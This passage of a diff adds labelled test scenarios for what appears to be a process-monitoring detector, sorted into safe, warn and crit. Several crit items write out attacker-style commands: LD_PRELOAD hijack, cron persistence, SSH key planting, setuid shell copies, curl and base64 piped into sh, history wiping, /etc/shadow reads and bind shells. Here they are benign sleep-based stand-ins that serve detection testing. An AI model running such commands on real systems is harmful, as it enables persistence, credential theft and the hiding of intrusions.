+steps = [{ cmd = "LD_PRELOAD=/tmp/.libx.so sleep {secs} 2>/dev/null", timeout = 30 }]
+
+[[scenarios]]
+id = "ld_preload_hijack.b"
+family = "ld_preload_hijack"
+label = "crit"
+expected = 2           # driver + sleep with a hijack path under /dev/shm
+at = 1120
+duration = 10
+params = { secs = 4 }
+steps = [{ cmd = "LD_LIBRARY_PATH=/dev/shm/.l LD_PRELOAD=/dev/shm/.l/libc-hook.so sleep {secs} 2>/dev/null", timeout = 30 }]
+
+[[scenarios]]
+id = "thread_burst.a"
+family = "thread_burst"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 2           # driver + python with 100 threads
+at = 1134
+duration = 12
+params = { n = 100 }
+steps = [{ cmd = "python3 -c \"import threading, time; [threading.Thread(target=time.sleep, args=(4,)).start() for _ in range({n})]; time.sleep(5)\"", timeout = 30 }]
+
+[[scenarios]]
+id = "thread_burst.b"
+family = "thread_burst"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 2           # driver + python with 160 threads
+at = 1150
+duration = 12
+params = { n = 160 }
+steps = [{ cmd = "python3 -c \"import threading, time; [threading.Thread(target=time.sleep, args=(5,)).start() for _ in range({n})]; time.sleep(6)\"", timeout = 30 }]
+
+[[scenarios]]
+id = "respawn_loop.a"
+family = "respawn_loop"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 51           # driver + 25 x (shell + sleep) respawns
+at = 1166
+duration = 16
+params = { n = 25 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do sh -c 'sleep 0.4'; i=$((i+1)); done", timeout = 32 }]
+
+[[scenarios]]
+id = "respawn_loop.b"
+family = "respawn_loop"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 16           # driver + 15 python respawns
+at = 1186
+duration = 16
+params = { n = 15 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do python3 -c 'import time; time.sleep(0.7)'; i=$((i+1)); done", timeout = 32 }]
+
+[[scenarios]]
+id = "busy_poll.a"
+family = "busy_poll"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 2           # driver + timeout + yes pinned on one cpu
+at = 1206
+duration = 12
+params = { secs = 8 }
+steps = [{ cmd = "timeout {secs} yes > /dev/null; true", timeout = 30 }]
+
+[[scenarios]]
+id = "busy_poll.b"
+family = "busy_poll"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 2           # driver + shell arithmetic loop
+at = 1222
+duration = 14
+params = { n = 600000 }
+steps = [{ cmd = "sh -c 'i=0; while [ $i -lt {n} ]; do i=$((i+1)); done'", timeout = 30 }]
+
+[[scenarios]]
+id = "one_off_script.a"
+family = "one_off_script"
+label = "warn"
+expected = 3           # driver + script shell + sleep
+at = 1240
+duration = 10
+params = { secs = 4 }
+steps = [{ cmd = "printf 'echo run; sleep {secs}\\n' > /tmp/once.sh && sh /tmp/once.sh", timeout = 30 }]
+
+[[scenarios]]
+id = "one_off_script.b"
+family = "one_off_script"
+label = "warn"
+expected = 3           # driver + script shell + sleep
+at = 1254
+duration = 10
+params = { secs = 5 }
+steps = [{ cmd = "printf 'sleep {secs}\\n' > /root/try-this.sh && sh /root/try-this.sh", timeout = 30 }]
+
+[[scenarios]]
+id = "vendor_binary.a"
+family = "vendor_binary"
+label = "warn"
+expected = 3           # driver + mkdir + cp + vendor binary
+at = 1268
+duration = 10
+params = { dir = "/opt/acme/bin", secs = 4 }
+steps = [{ cmd = "mkdir -p {dir} && cp /usr/bin/sleep {dir}/acme-agent && {dir}/acme-agent {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "vendor_binary.b"
+family = "vendor_binary"
+label = "warn"
+expected = 3           # driver + mkdir + cp + vendor binary
+at = 1282
+duration = 10
+params = { dir = "/opt/contoso", secs = 5 }
+steps = [{ cmd = "mkdir -p {dir} && cp /usr/bin/sleep {dir}/cts-sync && {dir}/cts-sync {secs}", timeout = 30 }]
+
+[[scenarios]]
+id = "hotfix_script.a"
+family = "hotfix_script"
+label = "warn"
+expected = 3           # driver + python script from the home dir
+at = 1296
+duration = 10
+params = { secs = 4 }
+steps = [{ cmd = "printf 'import time\\ntime.sleep({secs})\\n' > /root/hotfix.py && python3 /root/hotfix.py", timeout = 30 }]
+
+[[scenarios]]
+id = "hotfix_script.b"
+family = "hotfix_script"
+label = "warn"
+expected = 3           # driver + mkdir + python patch script
+at = 1310
+duration = 10
+params = { secs = 5 }
+steps = [{ cmd = "mkdir -p /root/fix && printf 'import time\\ntime.sleep({secs})\\n' > /root/fix/patch.py && python3 /root/fix/patch.py", timeout = 30 }]
+
+# =====================================================================
+# Stage-4 families (generated by scripts/gen_scenarios.py; docs/improve.md)
+# =====================================================================
+
+[[scenarios]]
+id = "compress_big.a"
+family = "compress_big"
+label = "warn"
+expected = 3
+at = 1332
+duration = 9
+params = { out = "/tmp/py.gz", secs = 2 }
+steps = [{ cmd = "gzip -c /usr/bin/python3* > {out}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "svc_status.c"
+family = "svc_status"
+label = "safe"
+expected = 3
+at = 1345
+duration = 8
+params = { secs = 2 }
+steps = [{ cmd = "systemctl is-active nginx; systemctl status nginx --no-pager | head -3; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "local_server.c"
+family = "local_server"
+label = "warn"
+expected = 3
+at = 1357
+duration = 10
+params = { port = 9100, secs = 3 }
+steps = [{ cmd = "python3 -m http.server {port} --bind 127.0.0.1 >/dev/null 2>&1 & sleep {secs}; kill $!", timeout = 40 }]
+
+[[scenarios]]
+id = "log_rotate.a"
+family = "log_rotate"
+label = "safe"
+expected = 3
+at = 1371
+duration = 9
+params = { dir = "/var/log", name = "app", secs = 2 }
+steps = [{ cmd = "mkdir -p {dir} && printf 'line\\n' > {dir}/{name}.log && gzip -f {dir}/{name}.log; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "write_loop.c"
+family = "write_loop"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 3
+at = 1384
+duration = 12
+params = { name = "dump.bin", mb = 30, secs = 5 }
+steps = [{ cmd = "dd if=/dev/zero of=/scratch/{name} bs=1M count={mb} 2>/dev/null; sleep {secs}; rm -f /scratch/{name}", timeout = 40 }]
+
+[[scenarios]]
+id = "cron_persist.a"
+family = "cron_persist"
+label = "crit"
+expected = 3
+at = 1400
+duration = 10
+params = { bin = "/usr/lib/.sysd", name = "sys-update", secs = 3 }
+steps = [{ cmd = "cp /usr/bin/sleep {bin} && printf '* * * * * root {bin}\\n' > /etc/cron.d/{name} && {bin} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "custom_daemon.a"
+family = "custom_daemon"
+label = "warn"
+expected = 3
+at = 1414
+duration = 9
+params = { bin = "/usr/local/sbin/syncd", secs = 4 }
+steps = [{ cmd = "mkdir -p $(dirname {bin}) && cp /usr/bin/sleep {bin} && {bin} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "admin_scan.a"
+family = "admin_scan"
+label = "warn"
+expected = 3
+at = 1427
+duration = 9
+params = { pat = "*.conf", secs = 2 }
+steps = [{ cmd = "find /etc -maxdepth 2 -name '{pat}' 2>/dev/null | head -5; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "report_job.a"
+family = "report_job"
+label = "safe"
+expected = 3
+at = 1440
+duration = 9
+params = { out = "/tmp/report.txt", secs = 2 }
+steps = [{ cmd = "date > {out}; uname -a >> {out}; df -h >> {out}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "ssh_key_drop.a"
+family = "ssh_key_drop"
+label = "crit"
+expected = 3
+at = 1453
+duration = 9
+params = { key = "C3Nza", secs = 3 }
+steps = [{ cmd = "mkdir -p /root/.ssh && printf 'ssh-ed25519 AAAA{key} root@x\\n' >> /root/.ssh/authorized_keys; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "setuid_copy.a"
+family = "setuid_copy"
+label = "crit"
+expected = 3
+at = 1466
+duration = 9
+params = { path = "/tmp/.rootsh", secs = 3 }
+steps = [{ cmd = "cp /bin/sh {path} && chmod u+s {path} && {path} -c 'sleep {secs}'", timeout = 40 }]
+
+[[scenarios]]
+id = "tool_upgrade.a"
+family = "tool_upgrade"
+label = "warn"
+expected = 3
+at = 1479
+duration = 9
+params = { bin = "/usr/local/bin/lumen", secs = 4 }
+steps = [{ cmd = "mkdir -p $(dirname {bin}) && cp /usr/bin/sleep {bin}.new && mv {bin}.new {bin} && {bin} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "log_rotate.b"
+family = "log_rotate"
+label = "safe"
+expected = 3
+at = 1492
+duration = 9
+params = { dir = "/srv/logs", name = "web", secs = 3 }
+steps = [{ cmd = "mkdir -p {dir} && printf 'line\\n' > {dir}/{name}.log && gzip -f {dir}/{name}.log; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "retry_storm.a"
+family = "retry_storm"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 3
+at = 1505
+duration = 12
+params = { n = 20, gap = 0.3 }
+steps = [{ cmd = "python3 -c \"import subprocess; [subprocess.run(['sleep', '{gap}']) for _ in range({n})]\"", timeout = 40 }]
+
+[[scenarios]]
+id = "env_wrapper.c"
+family = "env_wrapper"
+label = "warn"
+expected = 3
+at = 1521
+duration = 8
+params = { wrap = "timeout 20", secs = 3 }
+steps = [{ cmd = "{wrap} sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "remote_script.a"
+family = "remote_script"
+label = "crit"
+expected = 3
+at = 1533
+duration = 9
+params = { secs = 1 }
+steps = [{ cmd = "curl -s http://127.0.0.1/payload.sh | sh -s; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "health_probe.b"
+family = "health_probe"
+label = "safe"
+expected = 3
+at = 1546
+duration = 9
+params = { n = 4, path = "" }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do curl -sf -o /dev/null http://127.0.0.1/{path}; sleep 1; i=$((i+1)); done", timeout = 40 }]
+
+[[scenarios]]
+id = "remote_script.b"
+family = "remote_script"
+label = "crit"
+expected = 3
+at = 1559
+duration = 9
+params = { secs = 2 }
+steps = [{ cmd = "curl -s http://127.0.0.1/payload.sh | sh -s; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "svc_status.b"
+family = "svc_status"
+label = "safe"
+expected = 3
+at = 1572
+duration = 8
+params = { secs = 3 }
+steps = [{ cmd = "systemctl is-active nginx; systemctl status nginx --no-pager | head -3; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "retry_storm.c"
+family = "retry_storm"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 3
+at = 1584
+duration = 12
+params = { n = 15, gap = 0.5 }
+steps = [{ cmd = "python3 -c \"import subprocess; [subprocess.run(['sleep', '{gap}']) for _ in range({n})]\"", timeout = 40 }]
+
+[[scenarios]]
+id = "history_wipe.c"
+family = "history_wipe"
+label = "crit"
+expected = 3
+at = 1600
+duration = 8
+params = { secs = 3 }
+steps = [{ cmd = "rm -f /root/.bash_history; ln -sf /dev/null /root/.bash_history; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "masquerade.a"
+family = "masquerade"
+label = "crit"
+expected = 3
+at = 1612
+duration = 9
+params = { path = "/tmp/sshd", secs = 4 }
+steps = [{ cmd = "cp /usr/bin/sleep {path} && {path} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "admin_scan.b"
+family = "admin_scan"
+label = "warn"
+expected = 3
+at = 1625
+duration = 9
+params = { pat = "*.d", secs = 3 }
+steps = [{ cmd = "find /etc -maxdepth 2 -name '{pat}' 2>/dev/null | head -5; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "report_job.b"
+family = "report_job"
+label = "safe"
+expected = 3
+at = 1638
+duration = 9
+params = { out = "/var/tmp/report-daily.txt", secs = 3 }
+steps = [{ cmd = "date > {out}; uname -a >> {out}; df -h >> {out}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "source_checkout.c"
+family = "source_checkout"
+label = "safe"
+expected = 3
+at = 1651
+duration = 9
+params = { dir = "/srv/build", secs = 2 }
+steps = [{ cmd = "mkdir -p {dir}/src && cd {dir}/src && printf 'int main(){{}}\\n' > main.c && cp main.c main.bak; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "base64_pipe.b"
+family = "base64_pipe"
+label = "crit"
+expected = 3
+at = 1664
+duration = 9
+params = { b64 = "c2xlZXAgNA==" }
+steps = [{ cmd = "echo '{b64}' | base64 -d | sh; sleep 1", timeout = 40 }]
+
+[[scenarios]]
+id = "setuid_copy.b"
+family = "setuid_copy"
+label = "crit"
+expected = 3
+at = 1677
+duration = 9
+params = { path = "/var/tmp/.bash2", secs = 4 }
+steps = [{ cmd = "cp /bin/sh {path} && chmod u+s {path} && {path} -c 'sleep {secs}'", timeout = 40 }]
+
+[[scenarios]]
+id = "cron_persist.c"
+family = "cron_persist"
+label = "crit"
+expected = 3
+at = 1690
+duration = 10
+params = { bin = "/tmp/.sd", name = "anacron-x", secs = 3 }
+steps = [{ cmd = "cp /usr/bin/sleep {bin} && printf '* * * * * root {bin}\\n' > /etc/cron.d/{name} && {bin} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "masquerade.b"
+family = "masquerade"
+label = "crit"
+expected = 3
+at = 1704
+duration = 9
+params = { path = "/var/tmp/systemd-journald", secs = 4 }
+steps = [{ cmd = "cp /usr/bin/sleep {path} && {path} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "curl_flood.b"
+family = "curl_flood"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 3
+at = 1717
+duration = 12
+params = { n = 90 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do curl -s -o /dev/null http://127.0.0.1/; sleep 0.05; i=$((i+1)); done", timeout = 40 }]
+
+[[scenarios]]
+id = "bind_shell.c"
+family = "bind_shell"
+label = "crit"
+expected = 3
+at = 1733
+duration = 9
+params = { port = 5555, secs = 3 }
+steps = [{ cmd = "python3 -c \"import socket, time; s = socket.socket(); s.bind(('127.0.0.1', {port})); s.listen(1); time.sleep({secs})\"", timeout = 40 }]
+
+[[scenarios]]
+id = "disk_audit.c"
+family = "disk_audit"
+label = "warn"
+expected = 3
+at = 1746
+duration = 9
+params = { a = "/root", b = "/srv", secs = 2 }
+steps = [{ cmd = "du -sh {a} {b} 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "file_sync.c"
+family = "file_sync"
+label = "safe"
+expected = 3
+at = 1759
+duration = 9
+params = { dst = "/var/cache/sync", secs = 2 }
+steps = [{ cmd = "mkdir -p {dst} && cp -r /etc/default {dst}/ 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "gzip_loop.c"
+family = "gzip_loop"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 3
+at = 1772
+duration = 12
+params = { secs = 10 }
+steps = [{ cmd = "timeout {secs} sh -c 'yes | gzip -c > /dev/null'; true", timeout = 40 }]
+
+[[scenarios]]
+id = "local_server.b"
+family = "local_server"
+label = "warn"
+expected = 3
+at = 1788
+duration = 10
+params = { port = 8123, secs = 4 }
+steps = [{ cmd = "python3 -m http.server {port} --bind 127.0.0.1 >/dev/null 2>&1 & sleep {secs}; kill $!", timeout = 40 }]
+
+[[scenarios]]
+id = "test_runner.b"
+family = "test_runner"
+label = "safe"
+expected = 3
+at = 1802
+duration = 8
+params = { n = 4, secs = 1.5 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do python3 -c 'import time; time.sleep({secs})' & i=$((i+1)); done; wait", timeout = 40 }]
+
+[[scenarios]]
+id = "source_checkout.a"
+family = "source_checkout"
+label = "safe"
+expected = 3
+at = 1814
+duration = 9
+params = { dir = "/root/proj", secs = 2 }
+steps = [{ cmd = "mkdir -p {dir}/src && cd {dir}/src && printf 'int main(){{}}\\n' > main.c && cp main.c main.bak; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "tool_upgrade.c"
+family = "tool_upgrade"
+label = "warn"
+expected = 3
+at = 1827
+duration = 9
+params = { bin = "/usr/local/bin/pulse", secs = 5 }
+steps = [{ cmd = "mkdir -p $(dirname {bin}) && cp /usr/bin/sleep {bin}.new && mv {bin}.new {bin} && {bin} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "gzip_loop.b"
+family = "gzip_loop"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 3
+at = 1840
+duration = 12
+params = { secs = 8 }
+steps = [{ cmd = "timeout {secs} sh -c 'yes | gzip -c > /dev/null'; true", timeout = 40 }]
+
+[[scenarios]]
+id = "ssh_key_drop.b"
+family = "ssh_key_drop"
+label = "crit"
+expected = 3
+at = 1856
+duration = 9
+params = { key = "Q9wzz", secs = 2 }
+steps = [{ cmd = "mkdir -p /root/.ssh && printf 'ssh-ed25519 AAAA{key} root@x\\n' >> /root/.ssh/authorized_keys; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "big_alloc.a"
+family = "big_alloc"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 3
+at = 1869
+duration = 11
+params = { mb = 200, secs = 5 }
+steps = [{ cmd = "python3 -c \"import time; b = bytearray({mb} * 1024 * 1024); time.sleep({secs})\"", timeout = 40 }]
+
+[[scenarios]]
+id = "report_job.c"
+family = "report_job"
+label = "safe"
+expected = 3
+at = 1884
+duration = 9
+params = { out = "/root/report.txt", secs = 2 }
+steps = [{ cmd = "date > {out}; uname -a >> {out}; df -h >> {out}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "big_alloc.b"
+family = "big_alloc"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 3
+at = 1897
+duration = 11
+params = { mb = 300, secs = 5 }
+steps = [{ cmd = "python3 -c \"import time; b = bytearray({mb} * 1024 * 1024); time.sleep({secs})\"", timeout = 40 }]
+
+[[scenarios]]
+id = "compress_big.b"
+family = "compress_big"
+label = "warn"
+expected = 3
+at = 1912
+duration = 9
+params = { out = "/var/tmp/pybin.gz", secs = 3 }
+steps = [{ cmd = "gzip -c /usr/bin/python3* > {out}; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "base64_pipe.a"
+family = "base64_pipe"
+label = "crit"
+expected = 3
+at = 1925
+duration = 9
+params = { b64 = "c2xlZXAgMw==" }
+steps = [{ cmd = "echo '{b64}' | base64 -d | sh; sleep 1", timeout = 40 }]
+
+[[scenarios]]
+id = "env_wrapper.b"
+family = "env_wrapper"
+label = "warn"
+expected = 3
+at = 1938
+duration = 8
+params = { wrap = "nice -n 5", secs = 4 }
+steps = [{ cmd = "{wrap} sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "cred_read.a"
+family = "cred_read"
+label = "crit"
+expected = 3
+at = 1950
+duration = 8
+params = { out = "/tmp/.p", secs = 3 }
+steps = [{ cmd = "cat /etc/passwd /etc/shadow > {out} 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "history_wipe.b"
+family = "history_wipe"
+label = "crit"
+expected = 3
+at = 1962
+duration = 8
+params = { secs = 4 }
+steps = [{ cmd = "rm -f /root/.bash_history; ln -sf /dev/null /root/.bash_history; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "tool_upgrade.b"
+family = "tool_upgrade"
+label = "warn"
+expected = 3
+at = 1974
+duration = 9
+params = { bin = "/opt/tools/forgeit", secs = 4 }
+steps = [{ cmd = "mkdir -p $(dirname {bin}) && cp /usr/bin/sleep {bin}.new && mv {bin}.new {bin} && {bin} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "setuid_copy.c"
+family = "setuid_copy"
+label = "crit"
+expected = 3
+at = 1987
+duration = 9
+params = { path = "/tmp/.x11", secs = 3 }
+steps = [{ cmd = "cp /bin/sh {path} && chmod u+s {path} && {path} -c 'sleep {secs}'", timeout = 40 }]
+
+[[scenarios]]
+id = "write_loop.b"
+family = "write_loop"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 3
+at = 2000
+duration = 12
+params = { name = "cache.tmp", mb = 50, secs = 4 }
+steps = [{ cmd = "dd if=/dev/zero of=/scratch/{name} bs=1M count={mb} 2>/dev/null; sleep {secs}; rm -f /scratch/{name}", timeout = 40 }]
+
+[[scenarios]]
+id = "env_wrapper.a"
+family = "env_wrapper"
+label = "warn"
+expected = 3
+at = 2016
+duration = 8
+params = { wrap = "env LANG=C TZ=UTC", secs = 3 }
+steps = [{ cmd = "{wrap} sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "cred_read.c"
+family = "cred_read"
+label = "crit"
+expected = 3
+at = 2028
+duration = 8
+params = { out = "/dev/null", secs = 2 }
+steps = [{ cmd = "cat /etc/passwd /etc/shadow > {out} 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "custom_daemon.b"
+family = "custom_daemon"
+label = "warn"
+expected = 3
+at = 2040
+duration = 9
+params = { bin = "/opt/tools/rotd", secs = 5 }
+steps = [{ cmd = "mkdir -p $(dirname {bin}) && cp /usr/bin/sleep {bin} && {bin} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "pipe_spawn.a"
+family = "pipe_spawn"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 3
+at = 2053
+duration = 12
+params = { n = 60, secs = 4 }
+steps = [{ cmd = "python3 -c \"import subprocess; ps = [subprocess.Popen(['sleep', '{secs}']) for _ in range({n})]; [p.wait() for p in ps]\"", timeout = 40 }]
+
+[[scenarios]]
+id = "admin_scan.c"
+family = "admin_scan"
+label = "warn"
+expected = 3
+at = 2069
+duration = 9
+params = { pat = "host*", secs = 2 }
+steps = [{ cmd = "find /etc -maxdepth 2 -name '{pat}' 2>/dev/null | head -5; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "file_sync.a"
+family = "file_sync"
+label = "safe"
+expected = 3
+at = 2082
+duration = 9
+params = { dst = "/srv/mirror", secs = 2 }
+steps = [{ cmd = "mkdir -p {dst} && cp -r /etc/default {dst}/ 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "curl_flood.a"
+family = "curl_flood"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 3
+at = 2095
+duration = 12
+params = { n = 60 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do curl -s -o /dev/null http://127.0.0.1/; sleep 0.05; i=$((i+1)); done", timeout = 40 }]
+
+[[scenarios]]
+id = "history_wipe.a"
+family = "history_wipe"
+label = "crit"
+expected = 3
+at = 2111
+duration = 8
+params = { secs = 3 }
+steps = [{ cmd = "rm -f /root/.bash_history; ln -sf /dev/null /root/.bash_history; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "custom_daemon.c"
+family = "custom_daemon"
+label = "warn"
+expected = 3
+at = 2123
+duration = 9
+params = { bin = "/srv/bin/queued", secs = 4 }
+steps = [{ cmd = "mkdir -p $(dirname {bin}) && cp /usr/bin/sleep {bin} && {bin} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "log_rotate.c"
+family = "log_rotate"
+label = "safe"
+expected = 3
+at = 2136
+duration = 9
+params = { dir = "/tmp/logs", name = "worker", secs = 2 }
+steps = [{ cmd = "mkdir -p {dir} && printf 'line\\n' > {dir}/{name}.log && gzip -f {dir}/{name}.log; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "test_runner.c"
+family = "test_runner"
+label = "safe"
+expected = 3
+at = 2149
+duration = 8
+params = { n = 2, secs = 3 }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do python3 -c 'import time; time.sleep({secs})' & i=$((i+1)); done; wait", timeout = 40 }]
+
+[[scenarios]]
+id = "masquerade.c"
+family = "masquerade"
+label = "crit"
+expected = 3
+at = 2161
+duration = 9
+params = { path = "/tmp/kworker", secs = 3 }
+steps = [{ cmd = "cp /usr/bin/sleep {path} && {path} {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "pipe_spawn.b"
+family = "pipe_spawn"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 3
+at = 2174
+duration = 12
+params = { n = 100, secs = 4 }
+steps = [{ cmd = "python3 -c \"import subprocess; ps = [subprocess.Popen(['sleep', '{secs}']) for _ in range({n})]; [p.wait() for p in ps]\"", timeout = 40 }]
+
+[[scenarios]]
+id = "write_loop.a"
+family = "write_loop"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 3
+at = 2190
+duration = 12
+params = { name = "blob1", mb = 40, secs = 4 }
+steps = [{ cmd = "dd if=/dev/zero of=/scratch/{name} bs=1M count={mb} 2>/dev/null; sleep {secs}; rm -f /scratch/{name}", timeout = 40 }]
+
+[[scenarios]]
+id = "pipe_spawn.c"
+family = "pipe_spawn"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 3
+at = 2206
+duration = 12
+params = { n = 150, secs = 5 }
+steps = [{ cmd = "python3 -c \"import subprocess; ps = [subprocess.Popen(['sleep', '{secs}']) for _ in range({n})]; [p.wait() for p in ps]\"", timeout = 40 }]
+
+[[scenarios]]
+id = "disk_audit.b"
+family = "disk_audit"
+label = "warn"
+expected = 3
+at = 2222
+duration = 9
+params = { a = "/etc", b = "/opt", secs = 3 }
+steps = [{ cmd = "du -sh {a} {b} 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "svc_status.a"
+family = "svc_status"
+label = "safe"
+expected = 3
+at = 2235
+duration = 8
+params = { secs = 2 }
+steps = [{ cmd = "systemctl is-active nginx; systemctl status nginx --no-pager | head -3; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "retry_storm.b"
+family = "retry_storm"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 3
+at = 2247
+duration = 12
+params = { n = 30, gap = 0.2 }
+steps = [{ cmd = "python3 -c \"import subprocess; [subprocess.run(['sleep', '{gap}']) for _ in range({n})]\"", timeout = 40 }]
+
+[[scenarios]]
+id = "bind_shell.a"
+family = "bind_shell"
+label = "crit"
+expected = 3
+at = 2263
+duration = 9
+params = { port = 4444, secs = 4 }
+steps = [{ cmd = "python3 -c \"import socket, time; s = socket.socket(); s.bind(('127.0.0.1', {port})); s.listen(1); time.sleep({secs})\"", timeout = 40 }]
+
+[[scenarios]]
+id = "gzip_loop.a"
+family = "gzip_loop"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 3
+at = 2276
+duration = 12
+params = { secs = 6 }
+steps = [{ cmd = "timeout {secs} sh -c 'yes | gzip -c > /dev/null'; true", timeout = 40 }]
+
+[[scenarios]]
+id = "local_server.a"
+family = "local_server"
+label = "warn"
+expected = 3
+at = 2292
+duration = 10
+params = { port = 8099, secs = 3 }
+steps = [{ cmd = "python3 -m http.server {port} --bind 127.0.0.1 >/dev/null 2>&1 & sleep {secs}; kill $!", timeout = 40 }]
+
+[[scenarios]]
+id = "python_tool.c"
+family = "python_tool"
+label = "safe"
+expected = 3
+at = 2306
+duration = 8
+params = { code = "import os; print(os.getcwd())", secs = 2 }
+steps = [{ cmd = "python3 -c \"{code}\"; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "base64_pipe.c"
+family = "base64_pipe"
+label = "crit"
+expected = 3
+at = 2318
+duration = 9
+params = { b64 = "c2xlZXAgMg==" }
+steps = [{ cmd = "echo '{b64}' | base64 -d | sh; sleep 1", timeout = 40 }]
+
+[[scenarios]]
+id = "bind_shell.b"
+family = "bind_shell"
+label = "crit"
+expected = 3
+at = 2331
+duration = 9
+params = { port = 31337, secs = 4 }
+steps = [{ cmd = "python3 -c \"import socket, time; s = socket.socket(); s.bind(('127.0.0.1', {port})); s.listen(1); time.sleep({secs})\"", timeout = 40 }]
+
+[[scenarios]]
+id = "health_probe.c"
+family = "health_probe"
+label = "safe"
+expected = 3
+at = 2344
+duration = 9
+params = { n = 2, path = "payload.sh" }
+steps = [{ cmd = "i=0; while [ $i -lt {n} ]; do curl -sf -o /dev/null http://127.0.0.1/{path}; sleep 1; i=$((i+1)); done", timeout = 40 }]
+
+[[scenarios]]
+id = "source_checkout.b"
+family = "source_checkout"
+label = "safe"
+expected = 3
+at = 2357
+duration = 9
+params = { dir = "/home/dev/work", secs = 3 }
+steps = [{ cmd = "mkdir -p {dir}/src && cd {dir}/src && printf 'int main(){{}}\\n' > main.c && cp main.c main.bak; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "disk_audit.a"
+family = "disk_audit"
+label = "warn"
+expected = 3
+at = 2370
+duration = 9
+params = { a = "/usr", b = "/var", secs = 2 }
+steps = [{ cmd = "du -sh {a} {b} 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "cred_read.b"
+family = "cred_read"
+label = "crit"
+expected = 3
+at = 2383
+duration = 8
+params = { out = "/var/tmp/.pw", secs = 3 }
+steps = [{ cmd = "cat /etc/passwd /etc/shadow > {out} 2>/dev/null; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "python_tool.b"
+family = "python_tool"
+label = "safe"
+expected = 3
+at = 2395
+duration = 8
+params = { code = "import platform; print(platform.machine())", secs = 3 }
+steps = [{ cmd = "python3 -c \"{code}\"; sleep {secs}", timeout = 40 }]
+
+[[scenarios]]
+id = "curl_flood.c"
+family = "curl_flood"
+excluded = "runaway: a rate or resource spike cannot be seen in a single launch"
+expected = 3
+at = 2407
+duration = 12
